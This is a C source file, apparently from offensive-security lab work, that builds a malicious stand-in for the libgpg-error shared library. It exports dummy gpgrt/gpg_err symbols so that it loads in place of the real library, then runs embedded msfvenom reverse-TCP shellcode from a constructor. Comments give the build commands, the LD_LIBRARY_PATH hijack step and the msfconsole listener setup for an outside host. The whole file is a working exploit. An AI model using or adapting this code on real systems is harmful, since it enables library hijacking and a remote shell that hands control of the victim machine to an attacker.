// To Compile
// gcc -Wall -fPIC -c -o hax.o hax.c
// gcc -shared -Wl,--version-script gpg.map -o libgpgerror.so.0 hax.o
// export LD_LIBRARY_PATH=path/to/file
// cp libhax.so name_of_library_to_hack

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid
#include <sys/mman.h> // for mprotect #include <stdlib.h>
#include <dlfcn.h>

static void runmahpayload() __attribute__((constructor));

// sudo msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.49.83 LPORT=443 -a x64 -f c
// sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST 192.168.49.83; set LPORT 443; run"
unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x01\xbb\xc0\xa8"
"\x31\x53\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x26"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
int gpgrt_vbsprintf;
int gpgrt_ungetc;
int gpg_err_init;
int gpgrt_tmpfile;
int gpgrt_fputs_unlocked;
int gpgrt_ftello;
int gpgrt_flockfile;
int gpgrt_get_syscall_clamp;
int gpg_err_code_from_errno;
int gpgrt_clearerr;
int gpg_error_check_version;
int gpgrt_vfprintf;
int gpgrt_opaque_set;
int gpgrt_vasprintf;
int gpgrt_fprintf_unlocked;
int gpgrt_lock_init;
int gpgrt_ftell;
int gpgrt_fseeko;
int gpgrt_syshd;
int gpgrt_check_version;
int gpgrt_setvbuf;
int gpgrt_ftrylockfile;
int gpgrt_lock_destroy;
int gpgrt_fname_set;
int gpgrt_bsprintf;
int _gpgrt_set_std_fd;
int _gpgrt_pending_unlocked;
int gpgrt_fclose_snatch;
int gpgrt_fwrite;
int gpgrt_fseek;
int _gpgrt_get_std_stream;
int gpg_err_code_from_syserror;
int gpgrt_asprintf;
int gpg_err_code_to_errno;
int gpgrt_free;
int gpgrt_syshd_unlocked;
int gpgrt_set_nonblock;
int gpgrt_fread;
int gpgrt_fdopen_nc;
int gpgrt_opaque_get;
int gpgrt_fopenmem;
int gpgrt_lock_unlock;
int gpg_err_deinit;
int gpgrt_b64dec_start;
int gpgrt_b64dec_finish;
int gpgrt_fname_get;
int gpgrt_fpopen;
int gpgrt_fputc;
int gpgrt_snprintf;
int gpgrt_lock_trylock;
int gpgrt_fgetc;
int gpg_strerror;
int gpgrt_fopencookie;
int gpgrt_fileno_unlocked;
int gpgrt_vfprintf_unlocked;
int gpgrt_yield;
int gpgrt_write;
int gpgrt_printf_unlocked;
int gpgrt_fclose;
int gpgrt_fdopen;
int gpgrt_fpopen_nc;
int _gpgrt_getc_underflow;
int gpgrt_set_syscall_clamp;
int gpgrt_fputs;
int gpgrt_vsnprintf;
int gpgrt_fgets;
int gpgrt_write_sanitized;
int gpgrt_fileno;
int gpgrt_set_binary;
int gpgrt_lock_lock;
int gpgrt_write_hexstring;
int gpgrt_getline;
int gpgrt_fopenmem_init;
int gpgrt_printf;
int gpgrt_freopen;
int gpg_strsource;
int gpg_err_set_errno;
int gpgrt_sysopen_nc;
int gpgrt_rewind;
int gpgrt_setbuf;
int gpgrt_ferror_unlocked;
int gpgrt_mopen;
int gpgrt_read_line;
int gpgrt_feof;
int gpgrt_sysopen;
int gpgrt_set_alloc_func;
int gpgrt_funlockfile;
int gpgrt_read;
int gpgrt_fopen;
int _gpgrt_pending;
int gpgrt_clearerr_unlocked;
int gpgrt_get_nonblock;
int gpg_strerror_r;
int gpgrt_b64dec_proc;
int gpgrt_ferror;
int gpgrt_fprintf;
int gpgrt_fflush;
int gpgrt_poll;

void runmahpayload() 
{
        printf("DLL HIJACKING IN PROGRESS \n");

        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
                pagesize, PROT_READ|PROT_EXEC))
        {
                perror("mprotect");
        }
        int (*ret)() = (int(*)())buf;
        ret();

}

